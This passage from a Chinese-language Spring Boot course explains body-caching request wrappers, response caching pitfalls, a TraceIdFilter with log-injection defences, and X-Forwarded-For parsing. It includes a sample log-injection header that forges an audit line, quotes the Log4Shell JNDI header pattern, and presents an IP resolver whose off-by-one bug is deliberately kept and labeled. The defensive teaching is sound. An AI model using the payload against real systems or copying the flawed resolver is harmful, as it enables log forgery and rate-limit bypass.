// ❌ 錯誤用法
public class WrongLoggingFilter extends OncePerRequestFilter {
    protected void doFilterInternal(HttpServletRequest req, HttpServletResponse res,
                                    FilterChain chain) throws IOException, ServletException {
        var wrapper = new ContentCachingRequestWrapper(req);
        String body = new String(wrapper.getContentAsByteArray());     // ← 空的！
        log.info("request body: {}", body);
        chain.doFilter(wrapper, res);
    }
}
```

**`getContentAsByteArray()` 在 `chain.doFilter()` 之前呼叫一定是空的**，
因為還沒有人讀過 body。

**正確用法：在 `chain.doFilter()` 之後呼叫。**

```java
// ✅ 正確（但只適用於「事後記錄」）
var wrapper = new ContentCachingRequestWrapper(req);
try {
    chain.doFilter(wrapper, res);
} finally {
    byte[] body = wrapper.getContentAsByteArray();      // ← 現在有內容了
    log.info("request body: {}", new String(body, StandardCharsets.UTF_8));
}
```

⚠️ **三個限制**：

| 限制 | 說明 |
|---|---|
| **只能事後讀** | 無法在 `chain.doFilter()` 之前使用 → **不能用來做冪等指紋** |
| **Controller 沒讀就是空的** | 如果請求驗證失敗（400）在讀 body 之前就結束，日誌裡沒有 body |
| **有大小上限** | `new ContentCachingRequestWrapper(req, contentCacheLimit)`；超過的部分不記錄 |

#### 真正可重複讀的 wrapper

```java
package example.shop.common.web;

import jakarta.servlet.ReadListener;
import jakarta.servlet.ServletInputStream;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletRequestWrapper;

import java.io.BufferedReader;
import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.charset.Charset;
import java.nio.charset.StandardCharsets;

/**
 * 把 request body 一次讀進記憶體，讓它可以被讀「任意次」。
 *
 * <p>與 {@link org.springframework.web.util.ContentCachingRequestWrapper} 的差別：
 * <ul>
 *   <li>{@code ContentCachingRequestWrapper}：邊讀邊記錄，只能「事後」拿到內容。</li>
 *   <li>這個類別：在建構時就讀完，之後每次 {@code getInputStream()} 都回一個新的
 *       {@code ByteArrayInputStream} —— 所以冪等指紋（4.9）能在 Controller 之前算。</li>
 * </ul>
 *
 * <p>⚠️ 三個限制：
 * <ol>
 *   <li>body 會全部進記憶體 → 必須有大小上限。</li>
 *   <li>不可用於 multipart（檔案可能很大）—— 交給 05 章的 multipart 機制。</li>
 *   <li>不可用於 {@code application/x-www-form-urlencoded}：
 *       容器需要自己讀 body 來產生 {@code getParameter()}，先讀掉會讓表單參數消失。</li>
 * </ol>
 */
public class CachedBodyRequestWrapper extends HttpServletRequestWrapper {

    private final byte[] body;
    private final boolean truncated;

    public CachedBodyRequestWrapper(HttpServletRequest request, int maxBytes)
            throws IOException {
        super(request);
        var buffer = new java.io.ByteArrayOutputStream();
        try (var in = request.getInputStream()) {
            byte[] chunk = new byte[8192];
            int total = 0;
            int read;
            while ((read = in.read(chunk)) != -1) {
                if (total + read > maxBytes) {
                    // ★ 只快取到上限，但「繼續把剩下的讀掉」是錯的（浪費）；
                    //   這裡直接停止並標記 truncated，讓上層決定要不要拒絕
                    buffer.write(chunk, 0, maxBytes - total);
                    total = maxBytes;
                    break;
                }
                buffer.write(chunk, 0, read);
                total += read;
            }
            this.truncated = (total >= maxBytes && in.read() != -1);
        }
        this.body = buffer.toByteArray();
    }

    /** 快取的完整 body（不可修改）。 */
    public byte[] cachedBody() {
        return body.clone();
    }

    /** body 是否因為超過上限而被截斷 —— 截斷的 body 不可用於冪等指紋。 */
    public boolean isTruncated() {
        return truncated;
    }

    @Override
    public ServletInputStream getInputStream() {
        var delegate = new ByteArrayInputStream(body);
        return new ServletInputStream() {
            @Override public int read() { return delegate.read(); }
            @Override public int read(byte[] b, int off, int len) {
                return delegate.read(b, off, len);
            }
            @Override public int available() { return delegate.available(); }
            @Override public boolean isFinished() { return delegate.available() == 0; }
            @Override public boolean isReady() { return true; }
            @Override public void setReadListener(ReadListener listener) {
                throw new UnsupportedOperationException(
                        "CachedBodyRequestWrapper 不支援非阻塞讀取");
            }
        };
    }

    @Override
    public BufferedReader getReader() {
        Charset charset = StandardCharsets.UTF_8;
        String enc = getCharacterEncoding();
        if (enc != null) {
            try { charset = Charset.forName(enc); } catch (Exception ignored) { }
        }
        return new BufferedReader(new InputStreamReader(new ByteArrayInputStream(body), charset));
    }

    @Override
    public int getContentLength() {
        return body.length;
    }

    @Override
    public long getContentLengthLong() {
        return body.length;
    }
}
```

⚠️ **`setReadListener` 拋 `UnsupportedOperationException`** ——
這代表這個 wrapper **不能用在 Servlet 非阻塞 I/O 的路徑上**。
Spring MVC 的一般路徑是阻塞的，所以沒問題；
但如果你用了 `StreamingResponseBody` 或 Servlet 3.1 的非阻塞讀取，要小心。

**註冊它的 Filter**：

```java
package example.shop.common.web;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.springframework.core.annotation.Order;
import org.springframework.http.HttpMethod;
import org.springframework.http.MediaType;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;
import java.util.Set;

/**
 * 把 JSON request body 換成可重複讀的版本，讓後面的 filter / interceptor
 * 能在 Controller 之前讀 body（冪等指紋 4.9、請求日誌 4.6）。
 *
 * <p>order 必須早於 IdempotencyFilter 與 RequestLoggingFilter。
 */
@Component
@Order(-117)
public class CachedBodyFilter extends OncePerRequestFilter {

    /** 只有這些方法會有 body。 */
    private static final Set<String> METHODS_WITH_BODY =
            Set.of(HttpMethod.POST.name(), HttpMethod.PUT.name(),
                   HttpMethod.PATCH.name(), HttpMethod.DELETE.name());

    private final int maxBytes;

    public CachedBodyFilter(FilterProperties properties) {
        this.maxBytes = properties.cachedBodyMaxBytes();
    }

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {
        chain.doFilter(new CachedBodyRequestWrapper(request, maxBytes), response);
    }

    @Override
    protected boolean shouldNotFilter(HttpServletRequest request) {
        if (!METHODS_WITH_BODY.contains(request.getMethod())) return true;

        String contentType = request.getContentType();
        if (contentType == null) return true;

        String ct = contentType.toLowerCase(java.util.Locale.ROOT);
        // ⚠️ multipart 不快取（檔案可能很大，05 章有自己的機制）
        if (ct.startsWith(MediaType.MULTIPART_FORM_DATA_VALUE)) return true;
        // ⚠️ form-urlencoded 不快取（容器需要自己讀 body 產生 getParameter()）
        if (ct.startsWith(MediaType.APPLICATION_FORM_URLENCODED_VALUE)) return true;

        // 只處理 JSON（含 application/merge-patch+json 等）
        return !ct.contains("json");
    }

    /** ★ 讓這個 wrapper 在 ASYNC dispatch 時也生效（SSE / 非同步端點需要）。 */
    @Override
    protected boolean shouldNotFilterAsyncDispatch() {
        return false;
    }
}
```

> ### ⚠️⚠️ `shouldNotFilterAsyncDispatch()` 回 `false` 的**完整**後果 ★★
>
> 很多資料（包含本課程的早期版本）說：「就算回 `false`，`OncePerRequestFilter`
> 的『已執行過』attribute 還在，所以實際上不會重跑。」
> **那是錯的。** 回頭看 4.4.1 貼的原始碼：
>
> ```java
> else {
>     request.setAttribute(alreadyFilteredAttributeName, Boolean.TRUE);
>     try {
>         doFilterInternal(httpRequest, httpResponse, chain);
>     } finally {
>         request.removeAttribute(alreadyFilteredAttributeName);   // ★★ 移除了！
>     }
> }
> ```
>
> **attribute 是在 `finally` 裡被移除的。**
> 而 REQUEST dispatch 在進入非同步模式時，這個 `finally` **已經跑完了** ——
> filter chain 會一路 return 出去，工作執行緒才被釋放。
>
> **所以 ASYNC dispatch 開始時，attribute 是不存在的**：
>
> ```
> REQUEST dispatch
>   ├─ setAttribute(".FILTERED", true)
>   ├─ doFilterInternal → chain.doFilter → Controller 回傳 SseEmitter
>   ├─ chain 一路 return（請求進入非同步模式，但 filter 已經走完）
>   └─ finally: removeAttribute(".FILTERED")        ← ★ 這裡就移除了
>
> ASYNC dispatch
>   ├─ hasAlreadyFiltered = false                   ← ★ attribute 不在了
>   ├─ skipDispatch()：isAsyncDispatch && shouldNotFilterAsyncDispatch()
>   │     · 預設 true  → 跳過 doFilterInternal
>   │     · 覆寫成 false → ★★ doFilterInternal 【真的會再跑一次】
>   └─ …
> ```
>
> **兩個實務結論**：
>
> **① 覆寫成 `false` 的 filter，`doFilterInternal` 必須是冪等的。**
> `CachedBodyFilter` 只是「包一層 wrapper」，重跑一次只是多包一層 ——
> 無害（而且 `CachedBodyHttpServletRequest` 的建構子會偵測「已經是 wrapper」而直接沿用）。
>
> **② 而「產生新狀態」的 filter 重跑一次就是 bug。**
> `TraceIdFilter` 就是這一類 —— 它會呼叫 `traceIdSource.resolve()`，
> 而上游沒給 header 時那會**產生一個新的 traceId**。
> 所以 4.5.4 的 `TraceIdFilter` 必須自己做一次「已經有了就沿用」的檢查
> （見那一節的 `resolveOnce()`）。
>
> ⚠️ **不要依賴 `hasAlreadyFiltered` 來做冪等** —— 它在 ASYNC/ERROR dispatch 上不可靠。
> **冪等要自己做。**

#### 回應方向：`ContentCachingResponseWrapper`

想記錄回應 body（或做冪等重播）就需要包裝 response：

```java
var responseWrapper = new ContentCachingResponseWrapper(response);
try {
    chain.doFilter(request, responseWrapper);
} finally {
    byte[] body = responseWrapper.getContentAsByteArray();
    log.info("response body: {}", new String(body, StandardCharsets.UTF_8));
    // ★★★ 一定要這一行，否則客戶端收不到任何內容！
    responseWrapper.copyBodyToResponse();
}
```

⚠️ **`copyBodyToResponse()` 忘了寫是最經典的錯誤。**
症狀：**所有回應都是空的，但狀態碼正確。**

因為 `ContentCachingResponseWrapper` 把所有寫入攔截到記憶體 buffer，
`copyBodyToResponse()` 才真的寫到底層的 response。

⚠️ **第二個坑：`copyBodyToResponse()` 必須在 `finally` 裡。**
如果只寫在正常路徑上，例外發生時客戶端會收到空回應。

⚠️ **第三個坑：包裝 response 會讓「串流回應」失效。**
`StreamingResponseBody`、`SseEmitter` 的整個目的是「邊產生邊送出」，
而 `ContentCachingResponseWrapper` 會把它們全部緩衝到記憶體。

**一個 500 MB 的匯出檔案會讓服務 OOM。**

```java
@Override
protected boolean shouldNotFilter(HttpServletRequest request) {
    // ★ 串流端點不包裝 response
    String path = request.getRequestURI();
    return path.endsWith("/file")               // 匯出下載（05 章）
        || path.endsWith("/events")             // SSE（05 章）
        || path.contains("/download");
}
```

⚠️ **靠路徑判斷很脆弱。** 更可靠的做法是**只在需要時包裝**：
`IdempotencyFilter` 只對 `@Idempotent` 的端點包裝，
而那個資訊要靠 Interceptor 提供 —— 這是 4.9 的混合設計的另一個理由。

---

## 4.5 `TraceIdFilter`：完整實作 ★

### 4.5.1 需求清單

一個生產級的 traceId 機制要滿足**九條**需求：

| # | 需求 | 為什麼 |
|---|---|---|
| 1 | 接受上游傳來的 ID（`X-Request-Id` / `traceparent`） | 讓 Nginx / API Gateway / 前端的 ID 能串起來 |
| 2 | **驗證上游的 ID**（長度、字元集） | 防 **log injection**（4.5.3） |
| 3 | 上游沒給就自己產生 | 保證永遠有值 |
| 4 | 放進 MDC，讓所有 log 自動帶上 | 不用每行 log 手動傳 |
| 5 | 寫進回應 header | 前端能顯示、能上報 Sentry |
| 6 | 在 `finally` 清理 MDC | 執行緒池會重用執行緒，不清會**洩漏到下一個請求** |
| 7 | 涵蓋 404 / 401 / 被 Security 擋掉的請求 | 4.2.1 的除錯需求 |
| 8 | 與 Micrometer Tracing 共存 | 有分散式追蹤時不要產生兩套 ID |
| 9 | 非同步請求也要有 | SSE、`@Async`、`Callable`（4.5.7） |

### 4.5.2 `TraceContext`：常數與工具

```java
package example.shop.common.web;

import org.slf4j.MDC;

import java.security.SecureRandom;
import java.util.HexFormat;
import java.util.regex.Pattern;

/**
 * 追蹤上下文的常數與工具。
 *
 * <p>設計決策：
 * <ul>
 *   <li>traceId 是 16 個十六進位字元（64 bit）——與 W3C Trace Context 的 span-id 同長度，
 *       短到客服可以口述前 8 碼，長到不會碰撞（每秒 1000 請求下約 60 萬年碰撞一次）。</li>
 *   <li>用 {@link SecureRandom} 而不是 {@code UUID.randomUUID()}：
 *       後者是 128 bit（36 字元含連字號），對日誌來說太長。</li>
 * </ul>
 */
public final class TraceContext {

    /** MDC 的 key。log pattern 裡用 %X{traceId} 取。 */
    public static final String MDC_TRACE_ID = "traceId";

    /** 額外放進 MDC 的欄位（結構化日誌用，4.6.5）。 */
    public static final String MDC_ACTOR_ID = "actorId";
    public static final String MDC_ACTOR_TYPE = "actorType";
    public static final String MDC_ENDPOINT = "endpoint";
    public static final String MDC_CLIENT_IP = "clientIp";

    /** 上游可以傳入的 header（依優先順序）。 */
    public static final String HEADER_REQUEST_ID = "X-Request-Id";
    public static final String HEADER_TRACE_ID = "X-Trace-Id";
    public static final String HEADER_CORRELATION_ID = "X-Correlation-Id";

    /**
     * ★ 上游 ID 的白名單：只允許英數字、連字號、底線，長度 8～64。
     *
     * <p>這是防 log injection 的核心（4.5.3）。
     */
    private static final Pattern SAFE_ID = Pattern.compile("^[A-Za-z0-9_-]{8,64}$");

    private static final SecureRandom RANDOM = new SecureRandom();
    private static final HexFormat HEX = HexFormat.of();

    /** 產生一個新的 traceId（16 個十六進位字元）。 */
    public static String generate() {
        byte[] bytes = new byte[8];
        RANDOM.nextBytes(bytes);
        return HEX.formatHex(bytes);
    }

    /**
     * 驗證並正規化上游傳來的 ID。
     *
     * @return 合法的 ID，或 {@code null}（代表要自己產生）
     */
    public static String sanitize(String candidate) {
        if (candidate == null) return null;
        String trimmed = candidate.trim();
        if (!SAFE_ID.matcher(trimmed).matches()) return null;
        return trimmed;
    }

    /** 目前的 traceId；沒有就回 "unknown"（給 ProblemFactory 用，03 章 3.6.3）。 */
    public static String current() {
        String value = MDC.get(MDC_TRACE_ID);
        return (value == null || value.isBlank()) ? "unknown" : value;
    }

    /** 給使用者看的短版（8 碼，客服口述用）。 */
    public static String shortForm(String traceId) {
        if (traceId == null || traceId.isBlank()) return "unknown";
        return traceId.length() <= 8 ? traceId : traceId.substring(0, 8);
    }

    private TraceContext() {}
}
```

**為什麼 `SAFE_ID` 要求最短 8 碼？**
太短的 ID（例如 `1`）沒有唯一性，串起來的 log 會混在一起。
拒絕它並自己產生，比接受一個沒用的 ID 好。

### 4.5.3 log injection 是什麼 ★

**這是 4.5.1 需求 2 的理由，而且很多人不知道它存在。**

假設你不驗證上游的 header：

```java
String traceId = request.getHeader("X-Request-Id");     // ❌ 直接用
MDC.put("traceId", traceId);
```

攻擊者送：

```http
GET /orders HTTP/1.1
X-Request-Id: aaaa%0a2026-08-20 14:03:12.441 [main] ERROR SecurityAudit - 管理員 admin 已核准退款 999999 元
```

（`%0a` 是換行）

**你的日誌檔案裡會出現**：

```
2026-08-20 14:03:12.441 [http-nio-8080-exec-7] INFO  [aaaa
2026-08-20 14:03:12.441 [main] ERROR SecurityAudit - 管理員 admin 已核准退款 999999 元] - GET /orders 200
```

**攻擊者在你的日誌裡「偽造了一筆稽核紀錄」。**

三個後果：

| 後果 | 說明 |
|---|---|
| **稽核紀錄不可信** | 打官司時，你無法證明日誌沒被汙染 |
| **監控告警誤觸** | 日誌告警規則抓到「ERROR」→ 值班被叫起來 |
| **掩蓋真實攻擊** | 塞入大量假 log 讓真正的入侵痕跡被淹沒 |

⚠️ **更嚴重的變體**：如果日誌被送進會執行內容的系統
（例如某些 log viewer 的 HTML 渲染），就是 XSS；
如果 log 進了 Elasticsearch 而 Kibana 直接渲染，同樣有風險。

⚠️ **這不是理論。** Log4Shell（CVE-2021-44228）的攻擊向量之一
就是「把 `${jndi:ldap://...}` 塞進 header，讓它被寫進 log 時被求值」。
Logback 沒有 JNDI lookup，但**「不信任的資料進日誌」這個模式本身就是問題**。

**防護的兩層**：

```java
// 第一層：白名單驗證（TraceContext.sanitize）
private static final Pattern SAFE_ID = Pattern.compile("^[A-Za-z0-9_-]{8,64}$");
```

```xml
<!-- 第二層：logback 的 pattern 加 replace，把換行換掉 -->
<pattern>
  %d{yyyy-MM-dd HH:mm:ss.SSS} [%thread] %-5level [%X{traceId:-}] %logger{36}
  - %replace(%msg){'[\r\n]', '\\n'}%n
</pattern>
```

⚠️ **第二層很重要**，因為 traceId 不是唯一會進 log 的使用者輸入 ——
`userMessage`、`rejectedValue`、URL 都可能含換行。

### 4.5.4 完整的 `TraceIdFilter`

```java
package example.shop.common.web;

import jakarta.servlet.FilterChain;
import jakarta.servlet.ServletException;
import jakarta.servlet.http.HttpServletRequest;
import jakarta.servlet.http.HttpServletResponse;
import org.slf4j.MDC;
import org.springframework.core.annotation.Order;
import org.springframework.stereotype.Component;
import org.springframework.web.filter.OncePerRequestFilter;

import java.io.IOException;

/**
 * 為每個請求建立 traceId，放進 MDC 與回應 header。
 *
 * <p>order = -121：早於 Spring Security（-100），
 * 所以認證失敗（401）與授權失敗（403）的回應也會有 traceId。
 *
 * <p>⚠️ 這個 filter 刻意不排除任何路徑（連 /actuator 都要有 traceId），
 * 因為「健康檢查失敗」也需要能追。
 */
@Component
@Order(TraceIdFilter.ORDER)
public class TraceIdFilter extends OncePerRequestFilter {

    /** 早於 Security（-100），晚於 Micrometer 的 observation filter。 */
    public static final int ORDER = -121;

    private final TraceIdSource traceIdSource;
    private final ClientIpResolver clientIpResolver;      // ★ bean，不是 static（4.13.6）

    public TraceIdFilter(TraceIdSource traceIdSource, ClientIpResolver clientIpResolver) {
        this.traceIdSource = traceIdSource;
        this.clientIpResolver = clientIpResolver;
    }

    /**
     * ★★ 「這個請求的 traceId」放在 request attribute 上，
     * 讓 ASYNC / ERROR dispatch 重跑時能沿用同一個值。
     */
    private static final String TRACE_ID_ATTRIBUTE = TraceIdFilter.class.getName() + ".traceId";

    @Override
    protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response,
                                    FilterChain chain) throws ServletException, IOException {

        String traceId = resolveOnce(request);

        // ★ 先寫 header，再往下走。
        //   理由：如果下游把回應 commit 了（例如串流），之後就設不了 header。
        response.setHeader(TraceContext.HEADER_TRACE_ID, traceId);

        MDC.put(TraceContext.MDC_TRACE_ID, traceId);
        MDC.put(TraceContext.MDC_CLIENT_IP, clientIpResolver.resolve(request));

        try {
            chain.doFilter(request, response);
        } finally {
            // ★★★ 一定要清理。
            //   Tomcat 的執行緒池會重用執行緒；不清的話，下一個請求
            //   （如果它的 filter 因為某種原因沒設 MDC）會沿用這個 traceId。
            //   那比「沒有 traceId」更糟 —— 因為它是「錯的 traceId」。
            MDC.remove(TraceContext.MDC_TRACE_ID);
            MDC.remove(TraceContext.MDC_CLIENT_IP);
            MDC.remove(TraceContext.MDC_ACTOR_ID);
            MDC.remove(TraceContext.MDC_ACTOR_TYPE);
            MDC.remove(TraceContext.MDC_ENDPOINT);
        }
    }

    /**
     * 取得這個請求的 traceId —— <b>一個請求只解析一次</b>。
     *
     * <p>★★ 為什麼需要它（這是一個真實的 bug，不是防禦性程式碼）：
     *
     * <p>因為 {@link #shouldNotFilterAsyncDispatch()} 回 {@code false}，
     * 這個 filter 的 {@code doFilterInternal} 在 <b>ASYNC dispatch 時會再跑一次</b>。
     * 而 {@code OncePerRequestFilter} 的「已執行過」attribute 在 REQUEST dispatch 的
     * {@code finally} 裡就被移除了，所以它<b>擋不住</b>這次重跑（4.4.6）。
     *
     * <p>如果每次都呼叫 {@code traceIdSource.resolve(request)}，而上游沒有給
     * {@code X-Trace-Id} 標頭（絕大多數情況），那 ASYNC dispatch 就會
     * <b>產生一個新的 traceId</b>：
     *
     * <pre>
     * REQUEST dispatch：traceId = 4f2c8a1b9e3d7c50   → 進 MDC、進回應標頭
     * ASYNC dispatch： traceId = a91e04bb27f6d38c   → ★ 不一樣！
     *
     * → 同一個請求的 log 分成兩半，用回應標頭裡的 traceId 只查得到前半段
     * → 而「後半段」正是串流真正在寫資料的那一段（最需要查的地方）
     * </pre>
     *
     * <p>⚠️ 同樣的問題也發生在 ERROR dispatch（{@code shouldNotFilterErrorDispatch()}
     * 也回 {@code false}）——「錯誤頁的 traceId 與原始請求不同」會讓客服拿到的
     * 追蹤碼查不到任何東西。
     *
     * <p>★ 順便：request attribute 也讓 07 章 7.5.6 的
     * 「非同步的第二次 dispatch 不會產生新的 traceId」測試變成一個
     * <b>會通過</b>的測試。
     */
    private String resolveOnce(HttpServletRequest request) {
        Object existing = request.getAttribute(TRACE_ID_ATTRIBUTE);
        if (existing instanceof String s && !s.isBlank()) {
            return s;                                    // ★ ASYNC / ERROR dispatch 走這裡
        }
        String traceId = traceIdSource.resolve(request);
        request.setAttribute(TRACE_ID_ATTRIBUTE, traceId);
        return traceId;
    }

    /**
     * ★ 讓 ASYNC dispatch 也重建 MDC。
     *
     * <p>預設 true（不執行）會導致 SSE / Callable 端點的 ASYNC dispatch 沒有 traceId
     * （4.4.1 的說明）。但注意：這只解決「ASYNC dispatch 這條執行緒」，
     * 背景工作執行緒仍需 4.5.7 的 TaskDecorator。
     *
     * <p>⚠️⚠️ 而「會再跑一次」意味著 {@code doFilterInternal} <b>必須冪等</b> ——
     * 見 {@link #resolveOnce}。
     */
    @Override
    protected boolean shouldNotFilterAsyncDispatch() {
        return false;
    }

    /** ERROR dispatch 也要有 traceId（否則 /error 產生的回應查不到）。 */
    @Override
    protected boolean shouldNotFilterErrorDispatch() {
        return false;
    }
}
```

```java
package example.shop.common.web;

/**
 * 「分散式追蹤系統目前的 traceId」的抽象。
 *
 * <p>★ 抽成介面的兩個理由：
 * <ol>
 *   <li>專案不一定有 micrometer-tracing —— 沒有時用 {@link #DISABLED}，
 *       {@link TraceIdSource} 完全不用改。</li>
 *   <li>測試可以直接傳 lambda，不用建構一個反射版的 provider（4.14.1）。</li>
 * </ol>
 */
public interface TracingTraceIdProvider {

    /** @return 目前的 traceId，或 {@code null}（沒有追蹤／沒有 active span） */
    String currentTraceId();

    /** 沒有分散式追蹤時用這個。 */
    TracingTraceIdProvider DISABLED = () -> null;
}
```

```java
package example.shop.common.web;

import jakarta.servlet.http.HttpServletRequest;
import org.springframework.stereotype.Component;

/**
 * 決定這個請求的 traceId 從哪裡來。
 *
 * <p>優先順序：
 * <ol>
 *   <li>Micrometer Tracing 的 traceId（如果專案有分散式追蹤）—— 4.5.5</li>
 *   <li>上游的 X-Request-Id（Nginx 的 $request_id、API Gateway 的 ID）</li>
 *   <li>上游的 X-Trace-Id / X-Correlation-Id</li>
 *   <li>自己產生</li>
 * </ol>
 */
@Component
public class TraceIdSource {

    private final TracingTraceIdProvider tracingProvider;

    public TraceIdSource(TracingTraceIdProvider tracingProvider) {
        this.tracingProvider = tracingProvider;
    }

    public String resolve(HttpServletRequest request) {
        // 1. 有分散式追蹤就用它的（避免兩套 ID）
        String fromTracing = tracingProvider.currentTraceId();
        if (fromTracing != null) return fromTracing;

        // 2～3. 上游傳來的（一定要 sanitize，4.5.3）
        for (String header : new String[]{
                TraceContext.HEADER_REQUEST_ID,
                TraceContext.HEADER_TRACE_ID,
                TraceContext.HEADER_CORRELATION_ID}) {
            String sanitized = TraceContext.sanitize(request.getHeader(header));
            if (sanitized != null) return sanitized;
        }

        // 4. 自己產生
        return TraceContext.generate();
    }
}
```

```java
package example.shop.common.web;

import jakarta.servlet.http.HttpServletRequest;

import java.util.List;

/**
 * 解析客戶端真實 IP。
 *
 * <p>⚠️ 安全前提：{@code X-Forwarded-For} 是客戶端可控的。
 * 只有在「確定前面有可信代理，且它會「附加」（不是「覆寫」）自己的 IP」時才能用。
 *
 * <p>正確的讀法是「從右往左數」，數過你控制的代理層數。
 * 從左往右取第一個是常見錯誤 —— 那個值完全由客戶端決定。
 *
 * <p>⚠️ <b>下面的索引計算有一個 off-by-one 的 bug，會在 4.14.2 的測試裡被抓到。</b>
 * 這是刻意保留的 —— 請讀完 4.14.2 再照抄修正版，不要用這一版。
 */
@org.springframework.stereotype.Component
public class ClientIpResolver {

    /**
     * 我們控制的代理層數。
     * ⚠️ 這裡先寫死，4.13.6 會改成從 {@code FilterProperties} 讀 ——
     * 因為部署架構會變（加了 CDN 就變兩層）。
     */
    private static final int TRUSTED_PROXY_COUNT = 1;

    public String resolve(HttpServletRequest request) {
        String xff = request.getHeader("X-Forwarded-For");
        if (xff != null && !xff.isBlank()) {
            List<String> hops = java.util.Arrays.stream(xff.split(","))
                    .map(String::trim).filter(s -> !s.isEmpty()).toList();
            // ★ 從右往左數：最右邊是最靠近我們的代理加上的
            int index = hops.size() - 1 - TRUSTED_PROXY_COUNT;
            if (index >= 0 && index < hops.size()) {
                return sanitizeIp(hops.get(index));
            }
        }
        return sanitizeIp(request.getRemoteAddr());
    }

    /** ★ IP 也要 sanitize —— 它會進 MDC，也就是會進 log（4.5.3）。 */
    private static String sanitizeIp(String ip) {
        if (ip == null) return "unknown";
        String trimmed = ip.trim();
        if (trimmed.length() > 45) return "invalid";        // IPv6 最長 45 字元
        for (int i = 0; i < trimmed.length(); i++) {
            char c = trimmed.charAt(i);
            boolean ok = (c >= '0' && c <= '9') || (c >= 'a' && c <= 'f')
                    || (c >= 'A' && c <= 'F') || c == '.' || c == ':' || c == '%';
            if (!ok) return "invalid";
        }
        return trimmed;
    }

    private ClientIpResolver() {}
}
```

⚠️ **上面那段程式碼的 `index` 算錯了 —— 4.14.2 的測試會抓到並給出修正版。**
先看下面的原理，再去 4.14.2 拿正確的實作。

⚠️ **`ClientIpResolver` 的「從右往左數」是一個常被搞錯的細節。**

```
X-Forwarded-For: 1.2.3.4, 5.6.7.8, 10.0.0.1
                 ↑         ↑        ↑
                 客戶端    代理1    代理2（我們的 Nginx）
                 可偽造    可偽造   可信
```

**攻擊者可以自己送 `X-Forwarded-For: 8.8.8.8`**，
Nginx 會**附加**真實 IP 變成 `8.8.8.8, 真實IP`。
**取第一個 → 拿到 `8.8.8.8`（假的）；從右往左數 1 個 → 拿到真實 IP。**

**這在「依 IP 限流」時是關鍵**：取錯的話，攻擊者只要每次換一個假 IP 就能繞過限流。

### 4.5.5 與 Micrometer Tracing 共存

**如果專案有分散式追蹤（OpenTelemetry / Zipkin），不要自己產生 traceId。**

Spring Boot 3 的追蹤堆疊：

```
Micrometer Observation（API）
  └─ Micrometer Tracing（bridge）
       ├─ Brave（Zipkin）
       └─ OpenTelemetry
```

加上依賴後：

```xml
<dependency>
  <groupId>io.micrometer</groupId>
  <artifactId>micrometer-tracing-bridge-otel</artifactId>
</dependency>
<dependency>
  <groupId>io.opentelemetry</groupId>
  <artifactId>opentelemetry-exporter-otlp</artifactId>
</dependency>
```

**Boot 會自動**：
- 為每個請求建立 span（`ServerHttpObservationFilter`）。
- 把 `traceId` / `spanId` 放進 MDC。
- 把 log pattern 改成 `%5p [${spring.application.name:},%X{traceId:-},%X{spanId:-}]`。
- 傳播 W3C `traceparent` header 到下游呼叫。

**這時候我們的 filter 該做什麼？** 兩件事：

1. **讀它的 traceId，不要自己產生**（避免兩套 ID）。
2. **把它寫進回應 header**（Micrometer 不會做這件事）。

```java
package example.shop.common.web;

import org.springframework.stereotype.Component;

/**
 * 從 Micrometer Tracing 取得目前的 traceId。
 *
 * <p>用「optional bean 注入」而不是直接依賴 micrometer-tracing，
 * 讓專案在「沒有分散式追蹤」時也能編譯與執行。
 */
@Component
public class MicrometerTraceIdProvider implements TracingTraceIdProvider {

    private final Object tracer;               // io.micrometer.tracing.Tracer 或 null
    private final java.lang.reflect.Method currentSpanMethod;
    private final java.lang.reflect.Method contextMethod;
    private final java.lang.reflect.Method traceIdMethod;

    public MicrometerTraceIdProvider(
            org.springframework.beans.factory.ObjectProvider<Object> tracerProvider) {
        // ⚠️ 這個反射版本是為了「不引入依賴也能編譯」而寫的。
        //    如果你的專案一定會有 micrometer-tracing，直接注入 Tracer 型別更好：
        //
        //    public MicrometerTraceIdProvider(ObjectProvider<Tracer> provider) {
        //        this.tracer = provider.getIfAvailable();
        //    }
        //    public String currentTraceId() {
        //        if (tracer == null) return null;
        //        var span = tracer.currentSpan();
        //        return (span == null) ? null : span.context().traceId();
        //    }
        Object candidate = null;
        java.lang.reflect.Method m1 = null, m2 = null, m3 = null;
        try {
            if (tracerProvider == null) throw new ClassNotFoundException("no provider");
            Class<?> tracerType = Class.forName("io.micrometer.tracing.Tracer");
            candidate = tracerProvider.stream()
                    .filter(tracerType::isInstance).findFirst().orElse(null);
            if (candidate != null) {
                m1 = tracerType.getMethod("currentSpan");
                Class<?> spanType = Class.forName("io.micrometer.tracing.Span");
                m2 = spanType.getMethod("context");
                m3 = Class.forName("io.micrometer.tracing.TraceContext")
                        .getMethod("traceId");
            }
        } catch (ReflectiveOperationException ignored) {
            // 沒有 micrometer-tracing → 走自己產生的路徑
        }
        this.tracer = candidate;
        this.currentSpanMethod = m1;
        this.contextMethod = m2;
        this.traceIdMethod = m3;
    }

    @Override
    public String currentTraceId() {
        if (tracer == null) return null;
        try {
            Object span = currentSpanMethod.invoke(tracer);
            if (span == null) return null;
            Object context = contextMethod.invoke(span);
            Object traceId = traceIdMethod.invoke(context);
            return (traceId == null) ? null : traceId.toString();
        } catch (ReflectiveOperationException e) {
            return null;
        }
    }
}
```

**沒有 micrometer-tracing 時要註冊 fallback bean**：

```java
package example.shop.common.config;

import example.shop.common.web.TracingTraceIdProvider;
import org.springframework.boot.autoconfigure.condition.ConditionalOnMissingClass;
import org.springframework.context.annotation.Bean;
import org.springframework.context.annotation.Configuration;

@Configuration
public class TracingConfig {

    /** 專案沒有 micrometer-tracing 時，用 no-op 版本（自己產生 traceId）。 */
    @Bean
    @ConditionalOnMissingClass("io.micrometer.tracing.Tracer")
    TracingTraceIdProvider disabledTracingProvider() {
        return TracingTraceIdProvider.DISABLED;
    }
}
```

⚠️ **`@ConditionalOnMissingClass` 是 Spring Boot 的註解，可以用在一般 `@Configuration` 上**
（不限於 auto-configuration）。但要注意它比對的是**字串**，打錯字不會編譯錯誤 ——
